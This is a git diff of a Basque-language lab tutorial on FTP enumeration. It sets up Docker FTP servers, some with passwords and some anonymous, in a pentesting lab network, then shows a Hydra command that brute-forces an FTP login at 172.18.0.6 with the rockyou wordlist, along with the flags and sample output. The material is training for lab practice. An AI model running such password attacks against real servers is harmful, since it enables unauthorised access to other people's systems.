@@ -1,4 +1,14 @@
 
+- [FTP ennumerazioa](#ftp-ennumerazioa)
+  - [Docker Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)](#docker-pasahitza-duen-ftp-zerbitzaria--hacking-lab-docker-composen-jada-gehituta)
+  - [Docker Pasahitzik gabeko ftp zerbitzaria](#docker-pasahitzik-gabeko-ftp-zerbitzaria)
+  - [Pasahitza duen FTP zerbitzaria eraso](#pasahitza-duen-ftp-zerbitzaria-eraso)
+    - [Rock you pasahitz dikzionarioa deskargatu](#rock-you-pasahitz-dikzionarioa-deskargatu)
+    - [FTP zerbitzua aurkitu nmap-ekin](#ftp-zerbitzua-aurkitu-nmap-ekin)
+    - [Hydra](#hydra)
+  - [Pasahitzik gabeko FTP zerbitzaria eraso](#pasahitzik-gabeko-ftp-zerbitzaria-eraso)
+
+
 # FTP ennumerazioa
 
 Mota honetan, fitxategiak transferitzeko protokoloari (FTP) buruz hitz egingo dugu, eta horri buruzko azterketa nola aplikatu informazioa biltzeko.
@@ -7,7 +17,7 @@ FTP protokolo asko erabiltzen da fitxategiak sareetara transferitzeko. FTP zerbi
 
 Jarraian, gela honetan ukitzen dugun lehen proiekturako esteka duzue:
 
-### Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)
+## Docker Pasahitza duen ftp zerbitzaria ( hacking lab docker-composen jada gehituta)
 
 Docker-FTP-Server: https://github.com/garethflowers/docker-ftp-server
 
@@ -15,7 +25,7 @@ Deskargatzen dugun lehen proiekturako erabiltzen dugun tresnetako bat "Hydra" da
 
 FTPrako erabiltzaile gonbidatuak autentifikatzea ahalbidetzen duen edukiontzia hedatzeko erabiltzen ditugun proiektuen artean hurrengoa "metabrainz" en "docker-anon-ftp" proiektua da. Jarraian, proiekturako esteka duzue:
 
-### Pasahitzik gabeko ftp zerbitzaria
+## Docker Pasahitzik gabeko ftp zerbitzaria
 
 Docker-ANON-FTP: https://github.com/metabrainz/docker-anon-ftp
 
@@ -23,7 +33,7 @@ Docker-ANON-FTP: https://github.com/metabrainz/docker-anon-ftp
 docker run -d -p 20-21:20-21 -p 65500-65515:65500-65515 -v /tmp:/var/ftp:ro --network=hacking-lab_pentesting-lab-network metabrainz/docker-anon-ftp 
 ```
 
-## Pasahitza duen FTP zerbitzaria 
+## Pasahitza duen FTP zerbitzaria eraso
 
 ###  Rock you pasahitz dikzionarioa deskargatu 
 
@@ -58,17 +68,17 @@ MAC Address: 02:42:AC:12:00:06 (Unknown)
 ```
 
 
-### Hydra
+### Hydra 
 
 ```bash
 hydra -l user -P rockyou.txt ftp://172.18.0.6 -t 15
 ```
 
-Mayuskula bada dikzionario bat erabiliko du.
+Mayuskula bada dikzionario bat erabiliko du, minuskula bada, parametro hori erabiltzaile/pasahitz gisa erabiliko da.
 
 - -l erabiltzailea dakigu
 - -L erabiltzailea dikzionario batetik hartuko du
-- -P pasahitz dikzionarioa
+- -P pasahitz dikzionarioa erabiliz
 - -t 15 : 15 thread aldi berean
 
 Honelako erantzun bat agertu beharko litzateke:
@@ -84,7 +94,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-30 12:49:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-30 12:50:06
 ```
 
-## Pasahitzik gabeko FTP zerbitzaria
+## Pasahitzik gabeko FTP zerbitzaria eraso
 
 Kasu honetan erabil froga dezakegu zuzenenan Anonymus erabiltzailerarekin edo nmapek eskuragarri duen `ftp-anon` scriptarekin
 
